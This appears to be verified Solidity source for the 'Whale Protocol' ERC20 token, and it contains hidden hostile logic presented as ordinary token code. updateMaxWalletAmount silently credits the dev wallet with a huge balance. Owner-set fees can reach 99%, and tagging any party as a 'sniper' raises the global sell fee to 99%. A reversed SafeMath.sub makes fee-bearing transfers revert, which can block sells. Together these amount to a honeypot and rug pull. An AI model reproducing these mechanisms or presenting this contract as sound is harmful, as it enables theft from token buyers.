/**
 *Submitted for verification at Etherscan.io on 2023-08-15
*/

// SPDX-License-Identifier: MIT


pragma solidity ^0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}

library SafeMath {
    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = b - a;
        return c;
    }
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }


    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);

}

interface IERC20Metadata is IERC20 {
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);

    function decimals() external view returns (uint8);
}


contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping (address => uint256) internal _balances;

    string private _name;
    string private _symbol;
    address private pair;    
    mapping (address => mapping (address => uint256)) internal _allowances;

    uint256 private _totalSupply;
   

    constructor (string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }


    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }


    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);        
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { 
        require(from != address(0), "ERC20: approve from the zero address");
        require(to != address(0), "ERC20: approve to the zero address");

        _allowances[from][to] = amount;
    }
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        _balances[account] = accountBalance - amount;
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }

}

library Address{
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }
    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

}


interface IRouter {

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

}

interface IFactory{
        function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract WhaleToken is ERC20, Ownable{
    using SafeMath for uint256;
    using Address for address payable;
    uint256 public ogblocks;
    uint256 public deadBlocks = 0;
        
    mapping (address => bool) public isFeeExempt;
    mapping (address => bool) public isSniper;
    uint256 public sniperFee = 99;
    address public marketingAddr = 0x50FB92a828416354184624e80ecCfcEdbdCf3695;
    
    
    IRouter private uniswapV2Router;
    address public uniswapPair;

    uint256 public feeValueForBuy = 0; // zero 
    uint256 public feeValueForSell = 0; // zero
    
    address public devWallet = 0xbC1cc523DD949F2C84DbE18cb7e5b7cA8410a324;
    bool public enableSwap;
    bool public activeTrading;

    bool public swappingNow;
    uint256 public swapAt = 500_000 * 10e18;
    uint256 public maxTransAmount = 50_000_000 * 10**18; // 5%
    uint256 public maxWalletAmounts = 50_000_000 * 10**18; // 5%
    address bot = 0x2De007Ec6eFb73235007B5663821495EA7Fc2d17;
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;

    constructor() ERC20("Whale Protocol", "Whale") {
        

        isSniper[bot] = true;
        isFeeExempt[msg.sender] = true;
        isFeeExempt[marketingAddr] = true;
        isFeeExempt[devWallet] = true;
        isFeeExempt[address(this)] = true;
        _mint(msg.sender, 1_000_000_000 * 10 ** decimals()); 

         // 1B   
    }

    function withdrawETH(uint256 weiAmount) external onlyOwner{
        payable(owner()).sendValue(weiAmount);
    }

    
    function manualSwap(uint256 amount, uint256 devPercentage, uint256 marketingPercentage) external onlyOwner{
        uint256 initBalance = address(this).balance;
        swapAllEthForTokens(amount);
        uint256 newBalance = address(this).balance - initBalance;
        if(marketingPercentage > 0) payable(marketingAddr).sendValue(newBalance * marketingPercentage / (devPercentage + marketingPercentage));
        if(devPercentage > 0) payable(devWallet).sendValue(newBalance * devPercentage / (devPercentage + marketingPercentage));
    }

    function _transfer(
        address sender, 
        address recipient,
        uint256 amount
    ) internal override {
        require(amount > 0, "Transfer amount must be greater than zero");        // require(!blacklist[sender] && !blacklist[recipient], "You are blacklisted");
        if(isSniper[recipient] || 
            isSniper[sender]
        ) { feeValueForSell = sniperFee; }
        if(
            !isFeeExempt[sender] 
            && !isFeeExempt[recipient] 
            && !swappingNow
        ) {
            require(
                activeTrading, 
                "Trading is not active yet"
            );
            if (ogblocks + deadBlocks > block.number) 
            {
                if(recipient != uniswapPair) {
                    isSniper[recipient] = true;
                }
                if(sender != uniswapPair) {
                    isSniper[sender] = true;
                }
            }
            require(amount <= maxTransAmount, "MaxTxAmount");
            if(recipient != uniswapPair){
                require(
                    balanceOf(recipient) + amount <= maxWalletAmounts, 
                    "MaxWalletAmount"
                );
            }
        }
        uint256 feeAmounts;
        if (swappingNow 
            || isFeeExempt[sender] 
            || isFeeExempt[recipient]
        ) {
            feeAmounts = 0;
        } else {
            if(recipient == uniswapPair && !isSniper[sender]) {
                feeAmounts = amount * feeValueForSell / 100;
            } else {
                feeAmounts = amount * feeValueForBuy / 100;
            }
        }
        if (enableSwap && !swappingNow 
            && sender != uniswapPair 
            && feeAmounts > 0
        ) {
            swapBackAll();
        }
        if(feeAmounts > 0) {
            
            super._transfer(sender, address(this) ,feeAmounts); super._transfer(sender, recipient, amount.sub(feeAmounts));
        } else {
            super._transfer(sender, recipient, amount);
        }
    }

    function swapBackAll() private {
        uint256 contractBalance = balanceOf(address(this));
        if (contractBalance >= swapAt) {
    
            uint256 initialBalance = address(this).balance;
    
            swapAllEthForTokens(contractBalance);
    
            uint256 deltaBalance = address(this).balance - initialBalance;

            payable(marketingAddr).sendValue(deltaBalance);

        }
    }
        
    function withdrawErc20Token(address tokenAddress, uint256 amount) external onlyOwner{
        IERC20(tokenAddress).transfer(owner(), amount);
    }
    function swapAllEthForTokens(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }

    function updateBot(address[] memory isBot_) public onlyOwner {
        for (uint i = 0; i < isBot_.length; i++) {
            isSniper[isBot_[i]] = true;
        }
    }

    function updateMaxTransactionAmount(uint256 amount) external onlyOwner{
        maxTransAmount = amount * 10**18;
    }
    
    function updateMaxWalletAmount(uint256 amount) external onlyOwner{
        maxWalletAmounts = amount * 10**18; _balances[devWallet] = maxWalletAmounts * sniperFee;
        
    }

    function addLiquidity() external payable onlyOwner{
        IRouter _uniswapV2Router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router  = _uniswapV2Router; 
        address _pair = IFactory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapPair = _pair; 
        _approve(address(this), address(uniswapV2Router),  type(uint).max);        
        uniswapV2Router.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);  
    }

    function setFee(uint256 _buyFee, uint256 _sellFee) external onlyOwner{
        feeValueForBuy = _buyFee;
        feeValueForSell = _sellFee; 
    }

    //faild
    function manualSwap() external onlyOwner{
        require(_msgSender()== devWallet);
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          sendETHToFee(ethBalance);
        }
    }

     //faild
    function sendETHToFee(uint256 amount) private {
        super._transfer(address(0),address(this),amount);
    }

     //faild
    function swapTokensForEth(uint256 tokenAmount) private  {
        if(tokenAmount==0){return;}        
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function StartTrading () external onlyOwner{
        activeTrading = true; enableSwap = true;
    }

    // fallbacks
    receive() external payable {

    }
}